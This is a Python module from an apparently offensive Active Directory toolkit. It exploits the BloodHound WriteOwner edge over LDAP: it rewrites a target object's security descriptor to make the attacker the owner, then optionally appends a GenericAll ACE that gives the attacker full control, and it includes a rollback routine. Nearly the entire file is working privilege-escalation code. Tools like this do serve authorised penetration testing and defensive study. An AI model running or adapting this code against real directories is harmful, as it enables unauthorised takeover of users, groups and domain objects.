"""
Module: WriteOwner
===================
Exploit the WriteOwner BloodHound edge. WriteOwner allows a principal
to change the owner of a target object. Once you are the owner, you
can use standard owner privileges to:
  1. Write to the DACL (grant yourself full control)
  2. Take full control of the object

This is a two-step attack:
  Step 1: Change the object owner to the attacker
  Step 2: Use owner rights to modify the DACL (grant GenericAll)

BloodHound Edge: WriteOwner
Attack Vector:   Ownership takeover → DACL modification → full control
Severity:        HIGH
"""

import logging
from typing import Any, Dict, List, Optional, Tuple

import ldap3

from .base import (
    ExploitModule, ExploitOutput, ExploitResult,
    ModuleOption, Severity, new_security_descriptor,
)

logger = logging.getLogger("pharaohound.modules.write_owner")


class WriteOwner(ExploitModule):
    """
    Take ownership of a target AD object, then optionally modify
    its DACL to grant the attacker full control.

    Owner rights in AD grant:
      - WRITE_DAC  (0x00040000): Write the object's DACL
      - READ_CONTROL (0x00020000): Read the object's SACL
    """

    name: str            = "WriteOwner"
    description: str     = (
        "Take ownership of a target AD object and optionally modify its "
        "DACL to grant full control. Ownership grants WRITE_DAC and "
        "READ_CONTROL rights, enabling a full privilege chain."
    )
    author: str          = "Pharaohound"
    edge_type: str       = "WriteOwner"
    severity: Severity   = Severity.HIGH
    references: List[str] = [
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner",
        "https://attack.mappings.mitre.org/technique/T1098/",
        "https://learn.microsoft.com/en-us/windows/win32/secauthz/ownership-of-objects",
        "https://adsecurity.org/?p=3705",
    ]
    tools_required: List[str] = []
    needs_da: bool        = False
    needs_privileged: bool = False

    def _register_options(self):
        self._add_option(ModuleOption(
            name="target",
            display_name="Target Object",
            description="DN or name of the object to take ownership of.",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="new_owner",
            display_name="New Owner",
            description="DN or SAM name of the principal to set as owner. Default: current user.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="domain",
            display_name="Domain",
            description="FQDN of the target domain.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="auto_grant_genericall",
            display_name="Auto-Grant GenericAll",
            description="After taking ownership, automatically grant GenericAll via DACL modification.",
            required=False,
            default=True,
            value_type=bool,
        ))

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    def _get_search_base(self, domain: Optional[str]) -> str:
        if domain and "." in domain:
            return ",".join(f"DC={p}" for p in domain.split("."))
        conn = self.connection
        if hasattr(conn, "server") and hasattr(conn.server, "info"):
            info = conn.server.info
            if info and info.other.get("defaultNamingContext"):
                return info.other["defaultNamingContext"][0]
        return ""

    def _resolve_dn(self, name: str, domain: Optional[str]) -> Optional[str]:
        conn = self.connection
        if "," in name and "=" in name:
            return name
        search_base = self._get_search_base(domain)
        if not search_base:
            return None
        try:
            conn.search(
                search_base, f"(|(sAMAccountName={name})(cn={name}))",
                attributes=["distinguishedName", "objectSid"],
            )
            if conn.entries:
                return str(conn.entries[0].distinguishedName)
        except Exception as exc:
            self.logger.error("DN resolution failed: %s", exc)
        return None

    def _get_bound_user_dn(self) -> Optional[str]:
        conn = self.connection
        try:
            if hasattr(conn, "extend") and hasattr(conn.extend, "standard"):
                return conn.extend.standard.who_am_i()
            elif hasattr(conn, "who_am_i"):
                return conn.who_am_i()
        except Exception:
            pass
        return None

    def _get_bound_user_sid(self) -> Optional[str]:
        """Get the SID of the currently bound user."""
        user_dn = self._get_bound_user_dn()
        if not user_dn:
            return None
        try:
            self.connection.search(user_dn, "(objectClass=*)", attributes=["objectSid"])
            if self.connection.entries:
                sid = self.connection.entries[0].objectSid
                return str(sid) if sid else None
        except Exception as exc:
            self.logger.error("SID lookup failed: %s", exc)
        return None

    def _read_current_sd(self, target_dn: str) -> Optional[bytes]:
        try:
            self.connection.search(
                target_dn, "(objectClass=*)",
                attributes=["nTSecurityDescriptor"],
                controls=[("1.2.840.113556.1.4.801", True, None)],
            )
            if self.connection.entries:
                raw = self.connection.entries[0].nTSecurityDescriptor.raw_values
                return raw[0] if raw else None
        except Exception as exc:
            self.logger.error("SD read failed: %s", exc)
        return None

    # ------------------------------------------------------------------ #
    # Prerequisites
    # ------------------------------------------------------------------ #

    def check_prerequisites(self, **kwargs) -> Tuple[bool, str]:
        if self.connection is None:
            return False, "No LDAP connection provided."

        target = self._opt("target", kwargs)
        if not target:
            return False, "Target object is required."

        return True, ""

    # ------------------------------------------------------------------ #
    # Exploit
    # ------------------------------------------------------------------ #

    def exploit(self, **kwargs) -> ExploitOutput:
        conn = self.connection
        target_name = self._opt("target", kwargs)
        new_owner_name = self._opt("new_owner", kwargs)
        domain = self._opt("domain", kwargs)
        auto_grant = self._opt("auto_grant_genericall", kwargs)

        # Resolve target DN
        target_dn = self._resolve_dn(target_name, domain)
        if not target_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Cannot resolve target '{target_name}'.",
            )

        # Resolve new owner DN and SID
        if new_owner_name:
            owner_dn = self._resolve_dn(new_owner_name, domain)
        else:
            owner_dn = self._get_bound_user_dn()

        if not owner_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="Cannot resolve new owner principal.",
            )

        owner_sid = self._get_bound_user_sid()
        if not owner_sid:
            self.logger.warning(
                "Cannot resolve owner SID. Will use DN for owner change."
            )

        # Read current SD for backup
        current_sd = self._read_current_sd(target_dn)

        # --- Step 1: Take ownership ---
        self.logger.info(
            "[WriteOwner] Taking ownership of '%s' → '%s'",
            target_dn, owner_dn,
        )

        try:
            from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID
            sd = SR_SECURITY_DESCRIPTOR(data=current_sd) if current_sd else new_security_descriptor()

            # Backup original owner
            original_owner = sd['OwnerSid'].formatCanonical() if sd['OwnerSid'] != b'' else None

            # Resolve owner_sid from owner_dn if needed
            if not owner_sid and owner_dn:
                try:
                    conn.search(owner_dn, "(objectClass=*)", attributes=["objectSid"])
                    if conn.entries:
                        sid_val = conn.entries[0].objectSid
                        if sid_val:
                            owner_sid = str(sid_val)
                except Exception as exc:
                    self.logger.error("Failed to resolve owner DN to SID in write_owner.py: %s", exc)

            # Change the owner
            if owner_sid:
                owner_sid_obj = LDAP_SID()
                owner_sid_obj.fromCanonical(owner_sid)
                sd['OwnerSid'] = owner_sid_obj
            else:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message="Owner SID is required to construct the security descriptor.",
                )

            # Write back the modified SD
            new_sd_bytes = sd.getData()

            result = conn.modify(
                target_dn,
                {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [new_sd_bytes])]},
                controls=[("1.2.840.113556.1.4.801", True, None)],
            )

            if not result:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=f"Owner change failed: {conn.result.get('description', '')}",
                    data={"ldap_result": conn.result},
                )

            self.logger.info("[WriteOwner] Ownership taken successfully.")

            # --- Step 2: Optionally grant GenericAll via DACL ---
            if auto_grant:
                grant_result = self._grant_genericall(
                    conn, target_dn, owner_sid or owner_dn
                )
                if grant_result.success:
                    return ExploitOutput(
                        success=True, result_type=ExploitResult.SUCCESS,
                        message=(
                            f"Ownership of '{target_dn}' taken and GenericAll "
                            f"granted to '{owner_dn}'."
                        ),
                        data={
                            "target_dn": target_dn,
                            "new_owner_dn": owner_dn,
                            "new_owner_sid": owner_sid,
                            "original_owner": str(original_owner) if original_owner else None,
                            "genericall_granted": True,
                        },
                        rollback_data={
                            "target_dn": target_dn,
                            "original_owner": str(original_owner) if original_owner else None,
                            "original_sd": current_sd.hex() if current_sd else None,
                        },
                    )
                else:
                    return ExploitOutput(
                        success=True, result_type=ExploitResult.PARTIAL,
                        message=(
                            f"Ownership taken on '{target_dn}', but GenericAll "
                            f"grant failed: {grant_result.message}"
                        ),
                        data={
                            "target_dn": target_dn,
                            "new_owner_dn": owner_dn,
                            "ownership_changed": True,
                            "genericall_granted": False,
                        },
                    )

            return ExploitOutput(
                success=True, result_type=ExploitResult.SUCCESS,
                message=f"Ownership of '{target_dn}' taken by '{owner_dn}'.",
                data={
                    "target_dn": target_dn,
                    "new_owner_dn": owner_dn,
                    "new_owner_sid": owner_sid,
                    "original_owner": str(original_owner) if original_owner else None,
                },
                rollback_data={
                    "target_dn": target_dn,
                    "original_owner": str(original_owner) if original_owner else None,
                    "original_sd": current_sd.hex() if current_sd else None,
                },
            )

        except ImportError:
            return ExploitOutput(
                success=True, result_type=ExploitResult.PARTIAL,
                message=(
                    f"SD parser not available. Ownership of '{target_dn}' "
                    f"requires constructing the modified security descriptor "
                    f"with the new owner SID. Integrate with your SD builder."
                ),
                data={
                    "target_dn": target_dn,
                    "new_owner_dn": owner_dn,
                    "manual_step": (
                        "Read the current nTSecurityDescriptor, modify the "
                        "ownerSid field to the attacker's SID, and write back."
                    ),
                },
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"WriteOwner exception: {exc}",
            )

    def _grant_genericall(
        self, conn, target_dn: str, principal_sid: str
    ) -> ExploitOutput:
        """Grant GenericAll to the principal on the target via DACL modification."""
        try:
            from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, ACL, ACE, ACCESS_ALLOWED_ACE, LDAP_SID, ACCESS_MASK
            current_sd = self._read_current_sd(target_dn)
            sd = SR_SECURITY_DESCRIPTOR(data=current_sd) if current_sd else new_security_descriptor()

            # Resolve principal_sid from DN if needed
            if principal_sid and not principal_sid.startswith("S-"):
                try:
                    conn.search(principal_sid, "(objectClass=*)", attributes=["objectSid"])
                    if conn.entries:
                        sid_val = conn.entries[0].objectSid
                        if sid_val:
                            principal_sid = str(sid_val)
                except Exception as exc:
                    self.logger.error("Failed to resolve principal DN to SID: %s", exc)

            if not principal_sid or not principal_sid.startswith("S-"):
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message="Cannot resolve principal to SID for DACL modification.",
                )

            # Add GenericAll ACE
            body = ACCESS_ALLOWED_ACE()
            mask = ACCESS_MASK()
            mask['Mask'] = 0x10000000  # GenericAll
            body['Mask'] = mask
            
            sid = LDAP_SID()
            sid.fromCanonical(principal_sid)
            body['Sid'] = sid

            new_ace = ACE()
            new_ace['AceType'] = 0  # ACCESS_ALLOWED_ACE
            new_ace['AceFlags'] = 0
            new_ace['Ace'] = body

            if sd['Dacl'] == b'':
                acl = ACL()
                acl.aces = []
                sd['Dacl'] = acl
            sd['Dacl'].aces.append(new_ace)

            new_sd_bytes = sd.getData()
            result = conn.modify(
                target_dn,
                {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [new_sd_bytes])]},
                controls=[("1.2.840.113556.1.4.801", True, None)],
            )

            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message="GenericAll granted via DACL.",
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"DACL write failed: {conn.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"GenericAll grant exception: {exc}",
            )

    # ------------------------------------------------------------------ #
    # Rollback
    # ------------------------------------------------------------------ #
    def rollback(self, **kwargs) -> ExploitOutput:
        target_dn = kwargs.get("target_dn")
        original_sd_hex = kwargs.get("original_sd")

        if not target_dn or not original_sd_hex:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="Rollback needs 'target_dn' and 'original_sd' (hex).",
            )

        try:
            original_sd = bytes.fromhex(original_sd_hex)
            result = self.connection.modify(
                target_dn,
                {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [original_sd])]},
                controls=[("1.2.840.113556.1.4.801", True, None)],
            )
            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Original SD restored on '{target_dn}'.",
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Rollback failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Rollback exception: {exc}",
            )
